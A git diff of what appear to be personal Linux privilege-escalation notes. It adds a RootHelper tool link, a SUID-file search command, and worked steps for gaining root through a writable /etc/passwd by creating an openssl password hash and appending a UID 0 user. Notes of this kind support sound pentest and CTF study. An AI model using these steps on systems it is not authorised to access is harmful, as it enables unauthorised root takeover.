@@ -34,9 +34,15 @@ Start a server from the directory that contains LinEnum.sh
 3. `chmod +x LinEnum.sh
 4. Run `./LinEnum.sh` to begin scan
 
+##RootHelper
 
 
-# Exploiting SUID Files
+The RootHelper/Linux Smart Enumeration module is a LinEnum fork with a heavy focus on privilege escalation.
+https://github.com/NullArray/RootHelper
+
+---
+# Priv Esc
+## Exploiting SUID Files
 
 SUID files: Look like
 `-rwsr-xr-x
@@ -53,16 +59,33 @@ OR
 Use this command to search the system for SUID/GUID files:
 `find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files
 
+## Exploiting a writable /etc/passwd
+
+example entry of a user
+`test:x:0:0:root:/root:/bin/bash
+
+create a compliant password hash to add to our new user
+`openssl passwd -1 -salt [salt] [password]
+create a user entry to add onto /etc/passwd
+```
+nano /etc/passwd
+new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash"
+```
+switch to your new user and enter passwd
+`su new`
+you should have root
+`sudo -i
+
+
 ---
-# Exploiting a writable /etc/passwd
-
-
-
 # Handy Nix Files
 
 contains ssh configurations such as: PasswordAurhentication
-`etc/ssh/ssshd_config
+	`etc/ssh/ssshd_config
+A plain text file It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
+	`/etc/passwd` 
 
+---
 ## Windows 
 
 VNC servers, for example, frequently leave passwords in the registry stored in plaintext. 
